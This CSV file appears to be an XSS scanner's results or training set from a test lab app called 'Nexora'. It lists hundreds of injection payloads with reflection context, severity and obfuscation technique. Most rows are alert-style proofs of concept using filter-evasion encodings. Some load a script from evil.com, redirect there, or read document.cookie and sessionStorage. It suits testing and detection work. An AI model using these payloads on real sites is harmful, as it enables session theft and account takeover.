payload,payload_with_context,context,severity,source,sink,reflection_position,technique
"ONLoaD=""aLErt(1)""","ONLoaD=""aLErt(1)"" [position:html_body]",tag_injection,medium,,,html_body,mutated
"eval(""alert(1)"")","eval(""alert(1)"") [position:attribute]",event_handler,medium,,,attribute,mutated
"""><svg onload=alert()>","""><svg onload=alert()> [position:html_body snippet_context:..."">Untitled</div> <div style=""font-size:.9rem;color:var(--text-secondary)"">""><svg onload=alert()><]",tag_injection,medium,,,html_body,none
onload='alert(1)',onload='alert(1)' [position:attribute snippet_context:...g> <code>color</code> param in unquoted attribute: <code>style=background-color:onload='alert(1)'],tag_injection,medium,,,attribute,none
confirm(1);,confirm(1); [position:comment],attribute_escape,medium,,,comment,mutated
"""><script>alert(String.fromCharCode(66, 108, 65, 99, 75, 73, 99, 101))</script>","""><script>alert(String.fromCharCode(66, 108, 65, 99, 75, 73, 99, 101))</script> [position:attribute snippet_context:<!DOCTYPE html><html><head> <meta http-equiv=""refresh"" content=""5;url=""><script>alert(String.fromCha]",tag_injection,high,,,attribute,encoding
"""><script>alert(String.fromCharCode(88,83,83))</script>","""><script>alert(String.fromCharCode(88,83,83))</script> [position:attribute snippet_context:...-radius:6px;cursor:pointer;margin-left:.5rem"">Load</button></form> <iframe src=""""><script>alert(S]",tag_injection,high,,,attribute,encoding
"""><script alert(String.fromCharCode(88,83,83))</script>","""><script alert(String.fromCharCode(88,83,83))</script> [position:attribute snippet_context:...iv> <div style=""margin-top:.75rem;font-size:.875rem""> 🔗 <a href=""""><script alert(String.fromCharC]",tag_injection,high,,,attribute,encoding
onload='alert(1)',onload='alert(1)' [position:html_body],tag_injection,medium,,,html_body,none
"<svg onload=""confirm(7)"">","<svg onload=""confirm(7)""> [position:html_body snippet_context:<svg onload=""confirm(7)"">({""status"": ""ok"", ""message"": ""Nexora API response""});]",tag_injection,medium,,,html_body,none
"<object data=""javascript:alert(1)"">","<object data=""javascript:alert(1)""> [position:html_body]",tag_injection,medium,,,html_body,mutated
' onmouseover=\u0061\u006cert(1) ',' onmouseover=\u0061\u006cert(1) ' [position:attribute],attribute_escape,medium,,,attribute,obfuscated:unicode_escape
alert(1);,alert(1); [position:attribute snippet_context:...round:var(--bg-0);color:var(--text-primary);padding:2rem} .box{border:2px solid alert(1);;padding],tag_injection,medium,,,attribute,none
javascript:confirm(document.domain),javascript:confirm(document.domain) [position:style],js_uri,low,,,style,mutated
\' onerror=alert(1)//,\' onerror=alert(1)// [position:style],attribute_escape,medium,,,style,original
""" onfocus=alert(1) autofocus=""",""" onfocus=alert(1) autofocus="" [position:attribute]",attribute_escape,medium,,,attribute,original
<script>prompt(1)</script>,<script>prompt(1)</script> [position:html_body],script_injection,low,,,html_body,original
"</SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>","</SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT> [position:attribute snippet_context:<!DOCTYPE html><html><head> <meta http-equiv=""refresh"" content=""5;url=</SCRIPT>"">'><SCRIPT>alert(Str]",tag_injection,high,,,attribute,encoding|case_variation
alert(1);,alert(1); [position:script snippet_context:...nk:</strong> <code>name</code> injected inside JS string: <code>var username = 'alert(1);'</code>],tag_injection,medium,,,script,none
";alert(String.fromCharCode(88,83,83))// ></SCRIPT> > ><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",";alert(String.fromCharCode(88,83,83))// ></SCRIPT> > ><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT> [position:attribute snippet_context:...g> <code>color</code> param in unquoted attribute: <code>style=background-color:;alert(String.fro]",tag_injection,high,,,attribute,encoding|case_variation
<img src=x onload=alert(1)>,<img src=x onload=alert(1)> [position:html_body],tag_injection,medium,,,html_body,mutated
"%20""><svg onload=alert(1)>","%20""><svg onload=alert(1)> [position:attribute snippet_context:...-radius:6px;cursor:pointer;margin-left:.5rem"">Load</button></form> <iframe src=""%20""><svg onload=]",tag_injection,medium,,,attribute,url_encoding
onchange=”alert(‘AnonKryptiQuz’),"onchange=”alert(‘AnonKryptiQuz’) [position:attribute snippet_context:...ail: <input id=""reader-email"" name=""email"" value=""""> <br><br> <a href=""onchange=”alert(‘AnonKrypt]",tag_injection,medium,,,attribute,none
"<script>alert(String.fromCharCode(88,83,83))</script>","<script>alert(String.fromCharCode(88,83,83))</script> [position:dom snippet_context:XSS]",tag_injection,high,,,dom,encoding
"\""><img src=x onload=alert(1)>","\""><img src=x onload=alert(1)> [position:html_body]",attribute_escape,low,,,html_body,mutated
"<svg onload=""confirm(7)"">","<svg onload=""confirm(7)""> [position:html_body snippet_context:...<div class=""post-meta""><span class=""post-author"">Guest</span></div> <div><svg onload=""confirm(7)""]",tag_injection,medium,,,html_body,none
<img src=x onerror=confirm(1)>,<img src=x onerror=confirm(1)> [position:style],event_handler,high,,,style,mutated
"></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>","></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT> [position:attribute snippet_context:...ary);margin:.75rem 0"">Click below to continue to your destination.</p> <a href=""></SCRIPT>"">'><SC]",tag_injection,high,,,attribute,encoding|case_variation
"<object data=""javascript:alert(1)"">","<object data=""javascript:alert(1)""> [position:html_body]",tag_injection,low,,,html_body,original
<svg id=1 onload=confirm(1)>,"<svg id=1 onload=confirm(1)> [position:attribute snippet_context:...-radius:6px;cursor:pointer;margin-left:.5rem"">Load</button></form> <iframe src=""<svg id=1 onload=]",tag_injection,medium,,,attribute,none
"<img src
=x onerror
=alert(	1)>","<img src
=x onerror
=alert(	1)> [position:none]",event_handler,low,,,none,obfuscated:tab_newline_inject
"<img/src
=x onerror
=alert(	1)//>","<img/src
=x onerror
=alert(	1)//> [position:none]",event_handler,high,,,none,obfuscated:tab_newline_inject
<iframe/onload=alert(0);>,<iframe/onload=alert(0);> [position:comment],attribute_escape,medium,,,comment,none
""" onfocus=alert(1) autofocus=""",""" onfocus=alert(1) autofocus="" [position:attribute]",attribute_escape,medium,,,attribute,obfuscated:hex_escape
<image src/onerror=alert(1)>,<image src/onerror=alert(1)> [position:html_body],tag_injection,medium,,,html_body,none
"javascript:void(document.location=""http://evil.com"")","javascript:void(document.location=""http://evil.com"") [position:script]",js_uri,high,,,script,obfuscated:html_entity
</script><svg onload=alert(1)>,</script><svg onload=alert(1)> [position:attribute snippet_context:...nk:</strong> <code>name</code> injected inside JS string: <code>var username = '</script><svg onl],tag_injection,medium,,,attribute,none
javascript:alert(1),javascript:alert(1) [position:script],js_uri,high,,,script,mutated
"data:text/html,%3Cscript%3Ealert(1)%3C/script%3E","data:text/html,%3Cscript%3Ealert(1)%3C/script%3E [position:attribute]",js_uri,low,,,attribute,obfuscated:url_encode
%3cimg onerror=alert(1) src=a%3e,"%3cimg onerror=alert(1) src=a%3e [position:attribute snippet_context:...;border:1px solid var(--border);border-radius:6px;padding:1rem;margin:.75rem 0"">%3cimg onerror=al]",tag_injection,medium,,,attribute,url_encoding
<script>alert(1)</script>,<script>alert(1)</script> [position:script],script_injection,medium,,,script,original
"javascript:void(document.location=""http://evil.com"")","javascript:void(document.location=""http://evil.com"") [position:attribute]",js_uri,high,,,attribute,mutated
innerHTML=location.hash>#<script>alert(1)</script>,"innerHTML=location.hash>#<script>alert(1)</script> [position:html_body snippet_context:..."">Untitled</div> <div style=""font-size:.9rem;color:var(--text-secondary)"">iNNErhTMl=lOcatION.hAsH]",tag_injection,high,,,html_body,none
-alert(23)/,"-alert(23)/ [position:attribute snippet_context:...ref=""/static/style.css""> <style>body{background:var(--bg-0)} .themed{background:-alert(23)/;paddi]",tag_injection,medium,,,attribute,none
"""><svg onload=alert()>","""><svg onload=alert()> [position:attribute snippet_context:...;border:1px solid var(--border);border-radius:6px;padding:1rem;margin:.75rem 0"">""><svg onload=ale]",tag_injection,medium,,,attribute,none
&lt;%= alert(1) %&gt;,&lt;%= alert(1) %&gt; [position:html_body],script_injection,low,,,html_body,obfuscated:html_entity
""">< script alert(String.fromCharCode(88,83,83))</script>",""">< script alert(String.fromCharCode(88,83,83))</script> [position:html_body snippet_context:<!DOCTYPE html><html><head> <meta http-equiv=""refresh"" content=""5;url="">< script alert(String.fromCh]",tag_injection,high,,,html_body,mutated
"setTimeout(""al'+'ert(1)"",0)","setTimeout(""al'+'ert(1)"",0) [position:script]",dom_sink,medium,,,script,obfuscated:concat_split
"javascript:void(document.location=""http://evil.com"")","javascript:void(document.location=""http://evil.com"") [position:script]",js_uri,medium,,,script,mutated
"javascript:void(document.location=""http://evil.com"")","javascript:void(document.location=""http://evil.com"") [position:attribute]",attribute_escape,medium,,,attribute,mutated
"dAtA:TeXt/hTmL,<sCrIpT>AlErT(1)</ScRiPt>","dAtA:TeXt/hTmL,<sCrIpT>AlErT(1)</ScRiPt> [position:style]",js_uri,low,,,style,obfuscated:mixed_case
"&lt;object data=""javascript:alert(1)""&gt;","&lt;object data=""javascript:alert(1)""&gt; [position:script]",tag_injection,low,,,script,obfuscated:html_entity
嘼img src=1 onerror=alert(1)嘾,"嘼img src=1 onerror=alert(1)嘾 [position:attribute snippet_context:...ng>Sink:</strong> <code>val</code> inside onclick handler: <code>onclick=""calc('嘼img src=1 onerro]",tag_injection,medium,,,attribute,none
"prompt(1))//"";alert(String.fromCharCode(88,83,83))//--","prompt(1))//"";alert(String.fromCharCode(88,83,83))//-- [position:attribute snippet_context:..."">Nexora Member</span></div> </div> </div> <div class=""card"" data-user=""prompt(1))//"";alert(Strin]",tag_injection,high,,,attribute,mutated
"onerror=""alert('AnonKryptiQuz')""","onerror=""alert('AnonKryptiQuz')"" [position:attribute snippet_context:...ref=""/static/style.css""> <style>body{background:var(--bg-0)} .themed{background:onerror=""alert('A]",tag_injection,medium,,,attribute,none
<audio src/onerror=alert(1)>,"<audio src/onerror=alert(1)> [position:html_body snippet_context:...t-primary);padding:.65rem .9rem;border-radius:6px;font-family:Inter,sans-serif""><audio src/onerro]",tag_injection,medium,,,html_body,none
<svg/onload=alert(1)>,<svg/onload=alert(1)> [position:html_body],tag_injection,low,,,html_body,mutated
innerHTML=location.hash>#<script>alert(1)</script>,innerHTML=location.hash>#<script>alert(1)</script> [position:attribute snippet_context:...round:var(--bg-0);color:var(--text-primary);padding:2rem} .box{border:2px solid innerHTML=locatio],tag_injection,high,,,attribute,none
<DeTaIlS OpEn oNtOgGlE=AlErT(1)>,<DeTaIlS OpEn oNtOgGlE=AlErT(1)> [position:style],event_handler,high,,,style,obfuscated:mixed_case
"//"";alert(String.fromCharCode(88,83,83))","//"";alert(String.fromCharCode(88,83,83)) [position:attribute snippet_context:...ng>Sink:</strong> <code>val</code> inside onclick handler: <code>onclick=""calc('//"";alert(String.]",tag_injection,high,,,attribute,encoding
"setTimeout(""confirm(1)"",0)","setTimeout(""confirm(1)"",0) [position:script]",dom_sink,medium,,,script,mutated
onerror=alert;throw 23;,"onerror=alert;throw 23; [position:attribute snippet_context:...=""avatar"">O</div> <div> <div style=""font-weight:600;font-size:1.1rem"">onerror=alert;throw 23;</di]",tag_injection,low,,,attribute,none
"onerror=""alert(1)""","onerror=""alert(1)"" [position:html_body]",tag_injection,medium,,,html_body,none
"<Svg Only=1 OnLoad=confirm(atob(""Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ==""))>","<Svg Only=1 OnLoad=confirm(atob(""Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ==""))> [position:script snippet_context:...nk:</strong> <code>name</code> injected inside JS string: <code>var username = '<Svg Only=1 OnLoa]",tag_injection,high,,,script,encoding|case_variation
"setTimeout(""alert(1)"",0)","setTimeout(""alert(1)"",0) [position:script]",dom_sink,high,,,script,original
<body onunhandledrejection=alert(1)><script>fetch('//xyz')</script>,<body onunhandledrejection=alert(1)><script>fetch('//xyz')</script> [position:attribute snippet_context:...nk:</strong> <code>name</code> injected inside JS string: <code>var username = '<body onunhandled],tag_injection,high,,,attribute,none
<BODY ONLOAD=alert(8839)>,"<BODY ONLOAD=alert(8839)> [position:comment snippet_context:...le=""color:var(--text-muted);font-size:.875rem"">← DOM XSS</a> <!-- param:content=<BODY ONLOAD=aler]",tag_injection,medium,,,comment,case_variation
"<iframe src=""javascript:alert(1)"">","<iframe src=""javascript:alert(1)""> [position:html_body]",tag_injection,low,,,html_body,original
<svg Onload=aleRT()>,<svg Onload=aleRT()> [position:html_body],tag_injection,medium,,,html_body,mutated
.alert(1);,".alert(1); [position:attribute snippet_context:...ail: <input id=""reader-email"" name=""email"" value=""""> <br><br> <a href="".alert(1);"">Next >></a> </]",tag_injection,medium,,,attribute,none
"eval(""alert(1)"")","eval(""alert(1)"") [position:script]",dom_sink,low,,,script,mutated
"< script>d.innerHTML+='';</script>//[""'`-->]]>]</div>","< script>d.innerHTML+='';</script>//[""'`-->]]>]</div> [position:html_body]",attribute_escape,high,,,html_body,mutated
嘼img src=1 onerror=alert(1)嘾,"嘼img src=1 onerror=alert(1)嘾 [position:html_body snippet_context:...rm> </div> <div style=""font-size:.9rem;color:var(--text-secondary)"">嘼img src=1 onerror=alert(1)嘾<]",tag_injection,medium,,,html_body,none
"onerror=""alert('AnonKryptiQuz')""","onerror=""alert('AnonKryptiQuz')"" [position:attribute snippet_context:<!DOCTYPE html><html><head> <meta http-equiv=""refresh"" content=""5;url=onerror=""alert('AnonKryptiQuz']",tag_injection,medium,,,attribute,none
<BODY ONLOAD=alert(’XSS’)>,<BODY ONLOAD=alert(’XSS’)> [position:html_body],tag_injection,medium,,,html_body,case_variation
<script src=//evil.com/xss.js></script>,<script src=//evil.com/xss.js></script> [position:html_body],script_injection,medium,,,html_body,mutated
<audio src/onerror=alert(1)>,"<audio src/onerror=alert(1)> [position:attribute snippet_context:...ref=""/static/style.css""> <style>body{background:var(--bg-0)} .themed{background:<audio src/onerro]",tag_injection,medium,,,attribute,none
innerHTML=location.hash>#<img>alert(1)</script>,"innerHTML=location.hash>#<img>alert(1)</script> [position:html_body snippet_context:...title=""Delete this comment"">✕</button> </form> </div> <div>innerHTML=location.hash>#<img>alert(1)]",tag_injection,high,,,html_body,mutated
&lt;img/src=x onerror=alert(1)//&gt;,&lt;img/src=x onerror=alert(1)//&gt; [position:html_body],event_handler,low,,,html_body,obfuscated:html_entity
"<svg/onload
=alert(	1)>","<svg/onload
=alert(	1)> [position:html_body]",js_uri,medium,,,html_body,obfuscated:tab_newline_inject
<img/src=x onerror=alert(1)//>,<img/src=x onerror=alert(1)//> [position:html_body],event_handler,high,,,html_body,original
"</SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>","</SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT> [position:attribute snippet_context:...ong>Sink:</strong> <code>lang</code> inside JS string: <code>var currentLang = ""</SCRIPT>"">'><SCR]",tag_injection,high,,,attribute,encoding|case_variation
\' onerror=alert(1)//,\' onerror=alert(1)// [position:script],dom_sink,high,,,script,original
""" onload=alert(1) x=""",""" onload=alert(1) x="" [position:attribute]",attribute_escape,high,,,attribute,mutated
<img/src/onerror=alert(1),"<img/src/onerror=alert(1) [position:attribute snippet_context:..."">Nexora Member</span></div> </div> </div> <div class=""card"" data-user=""<img/src/onerror=alert(1)]",attribute_escape,medium,,,attribute,none
</tag><svg onload=alert(1)>,</tag><svg onload=alert(1)> [position:comment],attribute_escape,medium,,,comment,none
<img src/onerror=alert(1)>,"<img src/onerror=alert(1)> [position:comment snippet_context:...le=""color:var(--text-muted);font-size:.875rem"">← DOM XSS</a> <!-- param:content=<img src/onerror=]",tag_injection,medium,,,comment,none
"{{constructor.constructor(""confirm(1)"")()}}","{{constructor.constructor(""confirm(1)"")()}} [position:none]",template_injection,medium,,,none,mutated
javaSCRIPT:confirm(1),javaSCRIPT:confirm(1) [position:attribute],js_uri,high,,,attribute,mutated
<svgonload=alert(1)>,"<svgonload=alert(1)> [position:html_body snippet_context:<svg onload = alert(1) >({""status"": ""ok"", ""message"": ""Nexora API response""});]",tag_injection,medium,,,html_body,none
<BODY ONLOAD=alert(8839)>,<BODY ONLOAD=alert(8839)> [position:html_body snippet_context:...<section class=blog-header> <h1>0 search results for '<BODY ONLOAD=alert(8839)>'</h1> <hr> </sect],tag_injection,medium,,,html_body,case_variation
"\"" onerror=alert(1)//","\"" onerror=alert(1)// [position:style]",attribute_escape,low,,,style,mutated
"eVaL(""aLeRt(1)"")","eVaL(""aLeRt(1)"") [position:script]",tag_injection,low,,,script,obfuscated:mixed_case
"OnloaD=""ALERT(1)""","OnloaD=""ALERT(1)"" [position:html_body snippet_context:...gin-bottom:.75rem"">Bio</div> <div style=""font-size:.925rem;line-height:1.7"">OnloaD=""ALERT(1)""</di]",tag_injection,medium,,,html_body,mutated
<svg/onload=alert(1)>,<svg/onload=alert(1)> [position:script],tag_injection,high,,,script,original
onload='alert(1)',onload='alert(1)' [position:html_body],tag_injection,medium,,,html_body,none
#{alert(1)},#{alert(1)} [position:attribute],template_injection,high,,,attribute,mutated
innerHTML=location.hash>#<script>alert(1)</script>,"innerHTML=location.hash>#<script>alert(1)</script> [position:html_body snippet_context:...gin-bottom:.75rem"">Bio</div> <div style=""font-size:.925rem;line-height:1.7"">innerHTML=location.ha]",tag_injection,high,,,html_body,none
javascript:confirm(1),javascript:confirm(1) [position:html_body],template_injection,low,,,html_body,mutated
"window[""ev"".concat(""al"")](String.fromCharCode(97,108,101,114,116,40,49,41));","window[""ev"".concat(""al"")](String.fromCharCode(97,108,101,114,116,40,49,41)); [position:html_body snippet_context:..."">Untitled</div> <div style=""font-size:.9rem;color:var(--text-secondary)"">window[""ev"".concat(""al""]",tag_injection,high,,,html_body,encoding
${aLeRt(1)},${aLeRt(1)} [position:attribute],template_injection,low,,,attribute,obfuscated:mixed_case
onerror=”alert(‘AnonKryptiQuz’),onerror=”alert(‘AnonKryptiQuz’) [position:attribute snippet_context:...g> <code>color</code> param in unquoted attribute: <code>style=background-color:onerror=”alert(‘A],tag_injection,medium,,,attribute,none
"eval(""alert(1)"")","eval(""alert(1)"") [position:script]",dom_sink,low,,,script,original
j\u0061v\u0061script:\u0061\u006cert(1),j\u0061v\u0061script:\u0061\u006cert(1) [position:html_body],script_injection,low,,,html_body,obfuscated:unicode_escape
javaSCRIPT:alert(1),javaSCRIPT:alert(1) [position:attribute],attribute_escape,low,,,attribute,mutated
#{alert(1)},#{alert(1)} [position:script],template_injection,high,,,script,original
"<iframe src=""javascript:alert(1)"">","<iframe src=""javascript:alert(1)""> [position:script]",tag_injection,high,,,script,original
<BODY ONLOAD=alert(8839)>,<BODY ONLOAD=alert(8839)> [position:script snippet_context:...bject literal.</p> <h2>Multi-Param Reflection</h2> <p>a = </p><p>b = </p><p>c = <BODY ONLOAD=aler],tag_injection,medium,,,script,case_variation
"\""><img src=x onerror=alert(1)>","\""><img src=x onerror=alert(1)> [position:html_body]",template_injection,medium,,,html_body,original
"javascript:void(document.location=""http://evil.com"")","javascript:void(document.location=""http://evil.com"") [position:html_body]",js_uri,low,,,html_body,obfuscated:html_entity
<scr/**/ipt>prompt(1)</scr/**/ipt>,<scr/**/ipt>prompt(1)</scr/**/ipt> [position:html_body],script_injection,low,,,html_body,obfuscated:comment_inject
\x3cmarquee onstart=alert(1)\x3e,\x3cmarquee onstart=alert(1)\x3e [position:none],event_handler,medium,,,none,obfuscated:hex_escape
<img/src/onerror=alert(1),<img/src/onerror=alert(1) [position:html_body],tag_injection,medium,,,html_body,none
"eval(""alert(1)"")","eval(""alert(1)"") [position:style]",attribute_escape,low,,,style,obfuscated:html_entity
<BODY ONLOAD=alert(8839)>,"<BODY ONLOAD=alert(8839)> [position:html_body snippet_context:...title=""Delete this comment"">✕</button> </form> </div> <div><BODY ONLOAD=alert(8839)></div> </div>]",tag_injection,medium,,,html_body,case_variation
#{confirm(1)},#{confirm(1)} [position:script],dom_sink,high,,,script,mutated
"<Svg Only=1 OnLoad=confirm(atob(""Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ=="")>","<Svg Only=1 OnLoad=confirm(atob(""Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ=="")> [position:attribute snippet_context:...-radius:6px;cursor:pointer;margin-left:.5rem"">Load</button></form> <iframe src=""<Svg Only=1 OnLoa]",tag_injection,high,,,attribute,encoding|case_variation
' onerror=alert(1) x=',' onerror=alert(1) x=' [position:attribute],attribute_escape,high,,,attribute,mutated
<marquee onstart=alert(1)>,<marquee onstart=alert(1)> [position:script],event_handler,high,,,script,original
<body onunhandledrejection=alert(1)><script>fetch('//xyz')</script>,"<body onunhandledrejection=alert(1)><script>fetch('//xyz')</script> [position:attribute snippet_context:..."">Nexora Member</span></div> </div> </div> <div class=""card"" data-user=""<body onunhandledrejectio]",tag_injection,high,,,attribute,none
<svg/on\u006co\u0061d=\u0061\u006cert(1)>,<svg/on\u006co\u0061d=\u0061\u006cert(1)> [position:html_body],tag_injection,low,,,html_body,obfuscated:unicode_escape
"""><script>alert(String.fromCharCode(66, 108, 65, 99, 75, 73, 99, 101))</script>","""><script>alert(String.fromCharCode(66, 108, 65, 99, 75, 73, 99, 101))</script> [position:attribute snippet_context:...round:var(--bg-0);color:var(--text-primary);padding:2rem} .box{border:2px solid ""><script>alert(S]",tag_injection,high,,,attribute,encoding
<script>confirm(1)</script>,<script>confirm(1)</script> [position:html_body],script_injection,high,,,html_body,mutated
"location
=""javascript:alert(	1)""","location
=""javascript:alert(	1)"" [position:script]",dom_sink,medium,,,script,obfuscated:tab_newline_inject
"<svg onload=""confirm(7)"">","<svg onload=""confirm(7)""> [position:html_body snippet_context:...t-primary);padding:.65rem .9rem;border-radius:6px;font-family:Inter,sans-serif""><svg onload=""conf]",tag_injection,medium,,,html_body,none
"\""><img src=x onerror=alert(1)>","\""><img src=x onerror=alert(1)> [position:none]",attribute_escape,medium,,,none,original
"\""><img src=x onerror=alert(1)>","\""><img src=x onerror=alert(1)> [position:script]",event_handler,low,,,script,mutated
<%00script>d.innerHTML+='';</script>,"<%00script>d.innerHTML+='';</script> [position:html_body snippet_context:...title=""Delete this comment"">✕</button> </form> </div> <div><%00script>d.innerHTML+='';</script>//]",tag_injection,high,,,html_body,mutated
javascript:confirm(1),javascript:confirm(1) [position:none],js_uri,low,,,none,mutated
嘼img src=1 onerror=alert(1)嘾,"嘼img src=1 onerror=alert(1)嘾 [position:attribute snippet_context:...;border:1px solid var(--border);border-radius:6px;padding:1rem;margin:.75rem 0"">嘼img src=1 onerro]",tag_injection,medium,,,attribute,none
#{alert(1)},#{alert(1)} [position:style],template_injection,low,,,style,original
"window[""ev"".concat(""al"")](String.fromCharCode(97,108,101,114,116,40,49,41));","window[""ev"".concat(""al"")](String.fromCharCode(97,108,101,114,116,40,49,41)); [position:attribute snippet_context:..."">Nexora Member</span></div> </div> </div> <div class=""card"" data-user=""window[""ev"".concat(""al"")]]",tag_injection,high,,,attribute,encoding
{{7*7}},{{7*7}} [position:html_body],script_injection,high,,,html_body,obfuscated:unicode_escape
"'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT><img src="""" alt='","'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT><img src="""" alt=' [position:attribute snippet_context:...nk:</strong> <code>name</code> injected inside JS string: <code>var username = ''><SCRIPT>alert(S]",tag_injection,high,,,attribute,encoding|case_variation
"document.write(""<img src=x onerror=alert(1)>"")","document.write(""<img src=x onerror=alert(1)>"") [position:script]",tag_injection,high,,,script,obfuscated:comment_inject
<marquee onstart=alert(1)>,<marquee onstart=alert(1)> [position:html_body],script_injection,medium,,,html_body,obfuscated:comment_inject
"<Svg Only=1 OnLoad=confirm(atob(""Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ==""))>","<Svg Only=1 OnLoad=confirm(atob(""Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ==""))> [position:html_body snippet_context:..."">Untitled</div> <div style=""font-size:.9rem;color:var(--text-secondary)""><Svg Only=1 OnLoad=conf]",tag_injection,high,,,html_body,encoding|case_variation
<img src=asdf onerror=alert(JSON.stringify(sessionStorage))>,"<img src=asdf onerror=alert(JSON.stringify(sessionStorage))> [position:script snippet_context:...ong>Sink:</strong> <code>lang</code> inside JS string: <code>var currentLang = ""<img src=asdf one]",tag_injection,high,,,script,none
<body onload=alert()>,"<body onload=alert()> [position:attribute snippet_context:..."">Nexora Member</span></div> </div> </div> <div class=""card"" data-user=""<body onload=alert()>""> <]",attribute_escape,medium,,,attribute,mutated
"{{cOnStRuCtOr.cOnStRuCtOr(""AlErT(1)"")()}}","{{cOnStRuCtOr.cOnStRuCtOr(""AlErT(1)"")()}} [position:attribute]",template_injection,medium,,,attribute,obfuscated:mixed_case
"onload=""alert`1`""","onload=""alert`1`"" [position:html_body snippet_context:...rm> </div> <div style=""font-size:.9rem;color:var(--text-secondary)"">onload=""alert`1`""</div> </div]",tag_injection,medium,,,html_body,mutated
<video src=x onerror=alert(1)>,<video src=x onerror=alert(1)> [position:attribute],attribute_escape,low,,,attribute,original
<BODY ONLOAD=alert(8839)>,"<BODY ONLOAD=alert(8839)> [position:attribute snippet_context:...-radius:6px;cursor:pointer;margin-left:.5rem"">Load</button></form> <iframe src=""<BODY ONLOAD=aler]",tag_injection,medium,,,attribute,case_variation
"""><img src=x onerror=prompt(String.fromCharCode(100, 111, 99, 117, 109, 101, 110, 116, 46, 100, 111, 109, 97, 105, 110));>","""><img src=x onerror=prompt(String.fromCharCode(100, 111, 99, 117, 109, 101, 110, 116, 46, 100, 111, 109, 97, 105, 110));> [position:html_body snippet_context:...<div class=""post-meta""><span class=""post-author"">Guest</span></div> <div>""><img src=x onerror=pro]",tag_injection,high,,,html_body,encoding
foo\'; alert(document.cookie);//';,foo\'; alert(document.cookie);//'; [position:script snippet_context:...nk:</strong> <code>name</code> injected inside JS string: <code>var username = 'foo\'; alert(docu],script_injection,high,,,script,none
<img src=x onerror=alert(1)>,<img src=x onerror=alert(1)> [position:script],tag_injection,high,,,script,original
"<vIdeO><sourCe ontouchstart=""['al\u0065'+'rt'][0]['\x63onstructor']['\x63onstructor']('return this')()[['al\u0065'+'rt'][0]]([String.fromCharCode(8238)+[!+[]+!+[]]+[![]+[]][+[]]])"">","<vIdeO><sourCe ontouchstart=""['al\u0065'+'rt'][0]['\x63onstructor']['\x63onstructor']('return this')()[['al\u0065'+'rt'][0]]([String.fromCharCode(8238)+[!+[]+!+[]]+[![]+[]][+[]]])""> [position:attribute snippet_context:....82rem;color:var(--text-muted);margin-bottom:1rem"">Showing results for: <strong><vIdeO><sourCe on]",attribute_escape,high,,,attribute,mutated
"<object data=""javascript:alert(1)"">","<object data=""javascript:alert(1)""> [position:script]",tag_injection,high,,,script,original
<BODY ONLOAD=alert(8839)>,"<BODY ONLOAD=alert(8839)> [position:html_body snippet_context:..."">Untitled</div> <div style=""font-size:.9rem;color:var(--text-secondary)""><BODY ONLOAD=alert(8839]",tag_injection,medium,,,html_body,case_variation
<BODY ONLOAD=alert(‘XSS’)>,"<BODY ONLOAD=alert(‘XSS’)> [position:attribute snippet_context:...ng>Sink:</strong> <code>val</code> inside onclick handler: <code>onclick=""calc('<BODY ONLOAD=aler]",tag_injection,medium,,,attribute,case_variation
<svg/onload=alert(1)>,<svg/onload=alert(1)> [position:html_body],tag_injection,low,,,html_body,original
"{{constructor.constructor(""confirm(1)"")()}}","{{constructor.constructor(""confirm(1)"")()}} [position:attribute]",template_injection,high,,,attribute,mutated
